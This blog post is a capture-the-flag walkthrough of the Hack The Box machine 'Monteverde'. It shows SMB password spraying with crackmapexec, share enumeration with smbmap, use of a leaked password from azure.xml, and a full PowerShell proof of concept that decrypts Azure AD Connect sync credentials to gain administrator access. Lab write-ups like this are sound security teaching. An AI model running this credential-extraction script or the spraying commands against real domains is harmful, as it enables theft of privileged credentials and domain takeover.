---
layout: post
author: k0z4c
title: Monteverde
---

## **Getting Access**

We start as always with

![]({% link assets/htb/monteverde/nmap.png %})

We can spot a SMB and WinRM port.

After running enum4linux against the box we obtain  a list of users 

![]({% link assets/htb/monteverde/enum4linux.png %})

Let's try to access to port 445 using username as password
```bash
crackmapexec smb -u users_wdomain.lst -p users_wdomain.lst -d MEGABANK monteverde
```
![]({% link assets/htb/monteverde/userpwn.png %})

So now we have a valid account, SABatchJobs.

So let's list the shares
```bash
smbmap -L -d MEGABANK -u SABatchJobs -p SABatchJobs -H monteverde
```
![]({% link assets/htb/monteverde/shares.png %})

User$ share seems interesting.. let's take a look
```bash
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -d MEGABANK -r users$
```
![]({% link assets/htb/monteverde/azurefile.png %})


Seems that the only interesting file is azure.xml; let's download it 
![]({% link assets/htb/monteverde/azuredownload.png %})

aaah! an embedded password is spotted in the wild!
![]({% link assets/htb/monteverde/azurepassword.png %})

let's try to logon then with mhope user through winrm (the azure.xml file was in the mhope's folder)
![]({% link assets/htb/monteverde/winrmpwn.png %})

Gotcha!

## **Privilege escalation to Administrator**

Box, box on the net who's this user between all?
![]({% link assets/htb/monteverde/whoami.png %})

Nice; we can see that user's hope belongs to a very interesting group.


googlin'around we can find a way to escalate our privileges https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/

To sum up, the host is probably hosting the azure ad connect service, that is responsible to sync hashes from the on premise ad env to the azure (cloud) one.
When the aforementioned service is installed and configured in Password Hash Syncronization mode, it'll create a local database (ADSync), that stores data and metadata for the 
service itself.
Searching through this data we can find small bits that can be used to decrypt the password of the user owning the database, that is a user in the domain that can push the local ad hashes on the cloud.
(ndr the user must have the “replicating directory changes” in his ACL; so we can use the compromised account to perform a DCSync attack too!)


let's check if we can perform the attack.. 

An sqlserver instance is effectively running 
![]({% link assets/htb/monteverde/sqlinfo.png %})

An ADSync database is present
![]({% link assets/htb/monteverde/databasecheck.png %})

.. and owned by the administrator! :*

so the exploit might probably apply.. let's give it a try.
You can find the exploit code here https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545

You have only to change the connection string with dis one.
That's because we have to authenticate to a full flat sql server (not the express edition mentioned in the gist).

{% highlight powershell lineos %}
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
{% endhighlight %}


We then upload through our shell the poc and we run it
![]({% link assets/htb/monteverde/adminpwd.png %})

..fantastic.


Now let's connect to the box again with the new creds
![]({% link assets/htb/monteverde/adminpwn.png %})

... pwned (:

### **Credits** 

* the new exploit gist [here][new_exploit] (yea microsoft patches >:)
* the exploit explanation [here][exploit_blog] and [here][sspi] some SSPI authentication explanation.
* info about connection strings MDN [here][conn_str]

[exploit_blog]: https://blog.xpnsec.com/azuread-connect-for-redteam/
[sspi]: https://ldapwiki.com/wiki/Security%20Support%20Provider%20Interface
[new_exploit]: https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
[conn_str]:  https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?redirectedfrom=MSDN&view=dotnet-plat-ext-3.1#System_Data_SqlClient_SqlConnection_ConnectionString

